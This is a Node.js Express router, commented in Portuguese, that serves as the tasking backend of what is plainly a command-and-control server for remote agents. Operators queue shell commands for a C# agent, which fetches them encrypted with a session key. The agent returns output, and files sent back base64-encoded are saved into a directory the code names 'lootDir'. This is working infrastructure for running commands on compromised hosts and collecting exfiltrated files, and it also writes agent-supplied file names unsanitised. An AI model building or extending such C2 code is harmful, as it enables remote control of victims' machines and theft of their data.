const express = require('express');
const router  = express.Router();
const Task    = require('../models/Task');
const auth    = require('../middleware/auth');
const agentAuth = require('../middleware/agentAuth');
const fs = require('fs');
const { encrypt } = require('../utils/crypto');



// POST /api/tasks — operador cria tarefa via dashboard (protegido)
// O servidor só transporta o comando. Quem gerencia cwd é o agente.
router.post('/', auth, async (req, res) => {
  try {
    const { agentId, command, stdin, shell } = req.body;
    const task = new Task({ agentId, command, stdin, shell });
    await task.save();
    res.status(201).json(task);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/tasks/agent/:agentId — agente C# busca tarefas pendentes (sem auth)
router.get('/agent/:agentId', agentAuth, async (req, res) => {
  try {
    const tasks = await Task.find({
      agentId: req.agent._id,
      status:  'pending'
    });

    for (const task of tasks) {
      task.status = 'sent';
      await task.save();
    }

    const sessionKey = req.agent.sessionKey;

    if (sessionKey) {
      const encrypted = tasks.map(task => ({
        _id:       task._id,
        encrypted: encrypt(JSON.stringify({
        command: task.command,
        stdin:   task.stdin,
        shell:   task.shell
        }), sessionKey)
      }));
      return res.json(encrypted);
    }

    res.json(tasks);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});


// PUT /api/tasks/:id/result — agente C# devolve resultado (sem auth)
router.put('/:id/result', agentAuth, async (req, res) => {
  try {
    const task = await Task.findById(req.params.id);
    if (!task) return res.status(404).json({ error: 'Tarefa não encontrada' });

    const output = req.body.output;
    if (output.startsWith('b64:')) {
      const parts = output.split(':');
      const fileName = parts[1];
      const b64 = parts.slice(2).join(':');
      const buffer = Buffer.from(b64, 'base64');

      const lootDir = require('path').join(__dirname, '..', '..', 'outputs');
      fs.mkdirSync(lootDir, { recursive: true });
      fs.writeFileSync(require('path').join(lootDir, fileName), buffer);

      task.output = `Arquivo salvo em outputs/${fileName} (${buffer.length} bytes)`;
    } else {
      task.output = output;
    }
    task.status      = 'completed';
    task.completedAt = new Date();
    await task.save();

    res.json(task);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/tasks/history/:agentId — histórico completo (protegido)
router.get('/history/:agentId', auth, async (req, res) => {
  try {
    const tasks = await Task.find({ agentId: req.params.agentId })
      .sort({ createdAt: -1 });
    res.json(tasks);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;